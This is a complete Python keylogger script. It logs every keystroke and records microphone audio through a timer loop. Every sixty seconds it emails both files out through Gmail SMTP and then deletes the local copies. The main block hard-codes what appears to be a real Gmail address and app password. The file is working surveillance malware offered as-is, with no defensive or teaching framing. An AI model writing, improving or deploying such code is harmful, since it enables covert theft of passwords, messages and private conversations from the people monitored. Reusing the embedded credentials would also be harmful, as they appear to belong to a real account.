import os
import smtplib
import threading
import wave
import sounddevice as sd
from pynput import keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class Keylogger:
    def __init__(self, interval=60, email="youremail@gmail.com", password="yourpassword"):
        self.log_file = "keylog.txt"
        self.audio_file = "sound.wav"
        self.interval = interval
        self.email = email
        self.password = password

    def on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                f.write(key.char)
        except AttributeError:
            with open(self.log_file, 'a') as f:
                if str(key) == "Key.space":
                    f.write(" ")
                elif str(key) == "Key.enter":
                    f.write(" \n")
                elif str(key) in ["Key.right", "Key.left", "Key.up", "Key.down",
                                 "Key.shift", "Key.shift_r", "Key.ctrl_l",
                                 "Key.ctrl_r", "Key.alt_l", "Key.alt_r", "Key.tab"]:
                    f.write(" ")
                elif str(key) == "Key.backspace":
                    f.seek(f.tell() - 1, os.SEEK_SET)
                    f.truncate()
                else:
                    f.write(f'[ {str(key)} ]')

    def send_mail(self, filename):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Log File"
        msg.attach(MIMEText("See attachment", 'plain'))

        with open(filename, "rb") as attachment:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)

    def record_audio(self):
        fs = 44100
        seconds = self.interval

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, blocking=True)

        # convert float32 → int16
        audio_int16 = (myrecording * 32767).astype('int16')

        with wave.open(self.audio_file, 'wb') as obj:
            obj.setnchannels(1)
            obj.setsampwidth(2)   # 16 bits
            obj.setframerate(fs)
            obj.writeframes(audio_int16.tobytes())

    def report(self):
        if os.path.exists(self.log_file):
            self.send_mail(self.log_file)
            os.remove(self.log_file)

        self.record_audio()
        if os.path.exists(self.audio_file):
            self.send_mail(self.audio_file)
            os.remove(self.audio_file)

        threading.Timer(self.interval, self.report).start()

    def run(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.report()
        listener.join()


if __name__ == "__main__":
    keylogger = Keylogger(
        interval=60,
        email="stevensgibson3@gmail.com",
        password="osnufvgvwzkzgipu"  
    )
    keylogger.run()
